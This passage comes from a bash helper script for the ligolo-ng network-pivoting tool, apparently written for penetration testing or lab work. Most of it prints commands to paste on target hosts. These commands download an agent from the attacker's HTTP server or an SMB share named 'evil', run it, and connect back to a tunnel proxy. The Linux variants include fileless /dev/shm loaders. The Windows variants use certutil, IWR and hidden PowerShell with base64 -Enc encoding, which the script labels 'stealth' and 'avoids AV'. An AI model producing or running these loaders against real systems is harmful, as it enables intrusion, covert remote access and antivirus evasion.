    echo ""
    echo -e "  ${CYAN}# Step 2: In ligolo, relay NHAS port through pivot${NC}"
    echo -e "  ${YELLOW}listener_add --addr 0.0.0.0:3232 --to 127.0.0.1:3232 --tcp${NC}"
    echo ""
    echo -e "  ${CYAN}# Step 3: From target behind Pivot 1, execute NHAS${NC}"
    echo -e "  ${YELLOW}.\\\\nhas64.exe -d PIVOT1_INTERNAL_IP:3232${NC}"
    echo ""
    echo -e "  ${CYAN}# Step 4: Access from Kali${NC}"
    echo -e "  ${YELLOW}link agent${NC}"
    printf "  ${YELLOW}copy \\\\\\\\127.0.0.1\\\\evil\\\\agent.sh . && sh agent.sh${NC}\n"
    echo ""

    # -------------------------------------------------------------------------
    # TROUBLESHOOTING
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  TROUBLESHOOTING"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}# If a tunnel fails -- delete and recreate the interface:${NC}"
    echo -e "  ${YELLOW}interface_list${NC}                              ${GRAY}# Check active interfaces${NC}"
    echo -e "  ${YELLOW}interface_del --name ligolomachine01${NC}        ${GRAY}# Delete specific machine interface${NC}"
    echo -e "  ${YELLOW}interface_del --name ligolonet01${NC}       ${GRAY}# Delete specific internal interface${NC}"
    echo -e "  ${YELLOW}tunnel_stop${NC}                                 ${GRAY}# Stop active tunnel${NC}"
    echo -e "  ${YELLOW}tunnel_start${NC}                                ${GRAY}# Restart tunnel${NC}"
    echo ""
    echo -e "  ${CYAN}# If target won't connect:${NC}"
    echo -e "  ${YELLOW}ifconfig${NC}                         ${GRAY}# Show agent's network interfaces${NC}"
    echo -e "  ${YELLOW}certificate_fingerprint${NC}          ${GRAY}# Check certificate${NC}"
    echo ""
    echo -e "  ${CYAN}# Clean up all interfaces from Kali terminal:${NC}"
    echo -e "  ${LGRAY}for i in 01 02 03 04 05; do sudo ip link delete ligolomachine\$i 2>/dev/null; sudo ip link delete ligolonet\$i 2>/dev/null; done${NC}"
    echo ""

    # -------------------------------------------------------------------------
    # STARTING PROXY
    # -------------------------------------------------------------------------
    echo -e "${BOLD}=============================================="
    echo -e "  STARTING LIGOLO PROXY"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GREEN}[+]${NC} Working directory: ${YELLOW}${LIGOLO_DIR}${NC}"
    echo -e "  ${GREEN}[+]${NC} Config file: ${YELLOW}${LIGOLO_DIR}/ligolo-ng.yaml${NC}"
    echo -e "  ${GREEN}[+]${NC} All files stay in this directory"
    echo ""
    echo -e "  ${YELLOW}[*] Starting proxy on 0.0.0.0:$PROXY_PORT...${NC}"
    echo ""

    # =========================================================================
    # PRE-COMPUTE ALL BASE64 VARIANTS
    # =========================================================================

    # Linux /tmp variants
    LINUX_WGET_TMP_CMD="wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT&&chmod +x /tmp/$LINUX_AGENT&&/tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert"
    LINUX_WGET_TMP_B64=$(printf '%s' "$LINUX_WGET_TMP_CMD" | base64 -w0)

    LINUX_CURL_TMP_CMD="curl -so /tmp/$LINUX_AGENT http://$TUNIP:$HTTP_PORT/$LINUX_AGENT&&chmod +x /tmp/$LINUX_AGENT&&/tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert"
    LINUX_CURL_TMP_B64=$(printf '%s' "$LINUX_CURL_TMP_CMD" | base64 -w0)

    # Linux /dev/shm fileless
    LINUX_SHM_CMD="f=/dev/shm/.\$\$;curl -so \$f http://$TUNIP:$HTTP_PORT/$LINUX_AGENT&&chmod +x \$f&&\$f -connect $TUNIP:$PROXY_PORT -ignore-cert;rm -f \$f"
    LINUX_SHM_B64=$(printf '%s' "$LINUX_SHM_CMD" | base64 -w0)

    # Linux current dir variants
    LINUX_WGET_CWD_CMD="wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O ./$LINUX_AGENT&&chmod +x ./$LINUX_AGENT&&./$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert"
    LINUX_WGET_CWD_B64=$(printf '%s' "$LINUX_WGET_CWD_CMD" | base64 -w0)

    LINUX_CURL_CWD_CMD="curl -so ./$LINUX_AGENT http://$TUNIP:$HTTP_PORT/$LINUX_AGENT&&chmod +x ./$LINUX_AGENT&&./$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert"
    LINUX_CURL_CWD_B64=$(printf '%s' "$LINUX_CURL_CWD_CMD" | base64 -w0)

    # Windows HTTP (UTF-16LE base64 for powershell -Enc)
    PS_HTTP_CMD="(New-Object Net.WebClient).DownloadFile('http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}','C:\\Windows\\Temp\\${WIN_AGENT}'); C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert"
    PS_HTTP_ENC=$(printf '%s' "$PS_HTTP_CMD" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

    # Windows SMB (UTF-16LE base64)
    PS_SMB_CMD="copy \\\\${TUNIP}\\evil\\${WIN_AGENT} C:\\Windows\\Temp\\${WIN_AGENT} -Force; C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert"
    PS_SMB_ENC=$(printf '%s' "$PS_SMB_CMD" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

    # Windows IWR current dir (UTF-16LE base64)
    PS_IWR_CWD_CMD="iwr -Uri 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile .\\${WIN_AGENT}; & .\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert"
    PS_IWR_CWD_ENC=$(printf '%s' "$PS_IWR_CWD_CMD" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

    # =========================================================================
    # LINUX AGENT COMMANDS
    # =========================================================================
    echo -e "${BOLD}=============================================="
    echo -e "  LINUX AGENT COMMANDS  [ $LINUX_AGENT ]"
    echo -e "==============================================${NC}"
    echo ""

    echo -e "  ${CYAN}# 1. wget -> /tmp (standard)${NC}"
    echo -e "  ${YELLOW}wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O /tmp/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 2. wget -> /tmp (base64 one-liner)${NC}"
    echo -e "  ${GRAY}bash <(echo $LINUX_WGET_TMP_B64|base64 -d)${NC}"
    echo ""

    echo -e "  ${CYAN}# 3. curl -> /tmp (standard)${NC}"
    echo -e "  ${YELLOW}curl -so /tmp/$LINUX_AGENT http://$TUNIP:$HTTP_PORT/$LINUX_AGENT && chmod +x /tmp/$LINUX_AGENT && /tmp/$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 4. curl -> /tmp (base64 one-liner)${NC}"
    echo -e "  ${GRAY}bash <(echo $LINUX_CURL_TMP_B64|base64 -d)${NC}"
    echo ""

    echo -e "  ${CYAN}# 5. Fileless - curl -> /dev/shm (no disk write, auto-cleanup)${NC}"
    echo -e "  ${LGRAY}f=/dev/shm/.\$\$;curl -so \$f http://$TUNIP:$HTTP_PORT/$LINUX_AGENT&&chmod +x \$f&&\$f -connect $TUNIP:$PROXY_PORT -ignore-cert;rm -f \$f${NC}"
    echo ""

    echo -e "  ${CYAN}# 6. Fileless /dev/shm (base64 encoded)${NC}"
    echo -e "  ${GRAY}bash <(echo $LINUX_SHM_B64|base64 -d)${NC}"
    echo ""

    echo -e "  ${CYAN}# 7. wget -> current dir (writable dir, no /tmp access)${NC}"
    echo -e "  ${YELLOW}wget http://$TUNIP:$HTTP_PORT/$LINUX_AGENT -O ./$LINUX_AGENT && chmod +x ./$LINUX_AGENT && ./$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 8. wget -> current dir (base64 one-liner)${NC}"
    echo -e "  ${GRAY}bash <(echo $LINUX_WGET_CWD_B64|base64 -d)${NC}"
    echo ""

    echo -e "  ${CYAN}# 9. curl -> current dir (writable dir, no /tmp access)${NC}"
    echo -e "  ${YELLOW}curl -so ./$LINUX_AGENT http://$TUNIP:$HTTP_PORT/$LINUX_AGENT && chmod +x ./$LINUX_AGENT && ./$LINUX_AGENT -connect $TUNIP:$PROXY_PORT -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 10. curl -> current dir (base64 one-liner)${NC}"
    echo -e "  ${GRAY}bash <(echo $LINUX_CURL_CWD_B64|base64 -d)${NC}"
    echo ""

    # =========================================================================
    # WINDOWS AGENT COMMANDS
    # =========================================================================
    echo -e "${BOLD}=============================================="
    echo -e "  WINDOWS AGENT COMMANDS  [ $WIN_AGENT ]"
    echo -e "==============================================${NC}"
    echo ""

    echo -e "  ${CYAN}# 1. Standard SMB copy -> C:\Windows\Temp + execute${NC}"
    printf "  ${YELLOW}copy \\\\\\\\%s\\\\evil\\\\%s C:\\\\Windows\\\\Temp\\\\%s && C:\\\\Windows\\\\Temp\\\\%s -connect %s:%s -ignore-cert${NC}\n" \
        "$TUNIP" "$WIN_AGENT" "$WIN_AGENT" "$WIN_AGENT" "$TUNIP" "$PROXY_PORT"
    echo ""

    echo -e "  ${CYAN}# 2. Fileless (direct from SMB share, no local copy)${NC}"
    printf "  ${YELLOW}\\\\\\\\%s\\\\evil\\\\%s -connect %s:%s -ignore-cert${NC}\n" "$TUNIP" "$WIN_AGENT" "$TUNIP" "$PROXY_PORT"
    echo ""

    echo -e "  ${CYAN}# 3. PowerShell HTTP -> C:\Windows\Temp${NC}"
    echo -e "  ${YELLOW}(New-Object Net.WebClient).DownloadFile('http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}','C:\\Windows\\Temp\\${WIN_AGENT}'); C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 4. PowerShell HTTP -> Temp (unicode base64, Evil-WinRM / no &&)${NC}"
    echo -e "  ${GRAY}powershell -NoP -NonI -W Hidden -Enc $PS_HTTP_ENC${NC}"
    echo ""

    echo -e "  ${CYAN}# 5. certutil HTTP download -> Temp${NC}"
    echo -e "  ${YELLOW}certutil -urlcache -split -f http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT} C:\\Windows\\Temp\\${WIN_AGENT} && C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 6. SMB copy -> Temp (stealth PowerShell)${NC}"
    printf "  ${LGRAY}copy \\\\\\\\%s\\\\evil\\\\%s C:\\\\Windows\\\\Temp\\\\%s ; & 'C:\\\\Windows\\\\Temp\\\\%s' -connect %s:%s -ignore-cert${NC}\n" \
        "$TUNIP" "$WIN_AGENT" "$WIN_AGENT" "$WIN_AGENT" "$TUNIP" "$PROXY_PORT"
    echo ""

    echo -e "  ${CYAN}# 7. SMB copy -> Temp (unicode base64, avoids AV / NHAS style)${NC}"
    echo -e "  ${GRAY}powershell -NoP -NonI -W Hidden -Enc $PS_SMB_ENC${NC}"
    echo ""

    echo -e "  ${CYAN}# 8. IWR (Invoke-WebRequest) -> C:\Windows\Temp${NC}"
    echo -e "  ${YELLOW}iwr -Uri 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile 'C:\\Windows\\Temp\\${WIN_AGENT}'; C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 9. IWR -> current folder (drop-in, no path needed)${NC}"
    echo -e "  ${YELLOW}iwr -Uri 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile .\\${WIN_AGENT}; .\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert${NC}"
    echo ""

    echo -e "  ${CYAN}# 10. IWR current folder (unicode base64, Evil-WinRM / no &&)${NC}"
    echo -e "  ${GRAY}powershell -NoP -NonI -W Hidden -Enc $PS_IWR_CWD_ENC${NC}"
    echo ""

    echo -e "  ${CYAN}# 11. IWR one-liner (powershell -c, useful from cmd.exe)${NC}"
    echo -e "  ${GRAY}powershell -c \"iwr 'http://${TUNIP}:${HTTP_PORT}/${WIN_AGENT}' -OutFile C:\\Windows\\Temp\\${WIN_AGENT}; & C:\\Windows\\Temp\\${WIN_AGENT} -connect ${TUNIP}:${PROXY_PORT} -ignore-cert\"${NC}"
    echo ""
    echo ""
    echo ""
    echo -e "  ${CYAN}# run -> ligolofix <- to start running the ligolomachines, localrouting now works with autoroute."

    # Run proxy with full path, from LIGOLO directory
    sudo $PROXY_BIN -selfcert -laddr 0.0.0.0:$PROXY_PORT
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

ligoloscan() {
    PIVOT_NUM=${1:-1}

    echo ""
    echo -e "${BOLD}=============================================="
    echo -e "  Bulk Listener Setup for Pivot $PIVOT_NUM"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${GRAY}Copy & paste these in ligolo console after autoroute${NC}"
    echo ""

    for port in 80 443 445 3389 3306 1433 5985 5986 9200 8080 8443; do
        echo -e "  ${YELLOW}listener_add --addr 240.0.0.$PIVOT_NUM:$port --to 127.0.0.1:$port --tcp${NC}"
    done

    echo ""
}

ligolohelp() {
    echo ""
    echo -e "${BOLD}=============================================="
    echo -e "  LIGOLO Quick Reference"
    echo -e "==============================================${NC}"
    echo ""
    echo -e "  ${CYAN}tunnel_list${NC}           ${GRAY}# Show all active sessions${NC}"
    echo -e "  ${CYAN}session${NC}               ${GRAY}# Switch to a session${NC}"
    echo -e "  ${CYAN}autoroute${NC}             ${GRAY}# Auto setup interface + routes + tunnel${NC}"
    echo -e "  ${CYAN}listener_add${NC}          ${GRAY}# Forward a port through tunnel${NC}"
    echo -e "  ${CYAN}listener_list${NC}         ${GRAY}# Show all forwarders${NC}"
    echo -e "  ${CYAN}listener_stop --id N${NC}  ${GRAY}# Stop a forwarder${NC}"
    echo -e "  ${CYAN}interface_list${NC}        ${GRAY}# Show all TUN interfaces${NC}"
    echo -e "  ${CYAN}ifconfig${NC}              ${GRAY}# Show agent's network interfaces${NC}"
    echo ""
}

# ============================================================================
# RUN MAIN FUNCTION
# ============================================================================

ligoloup
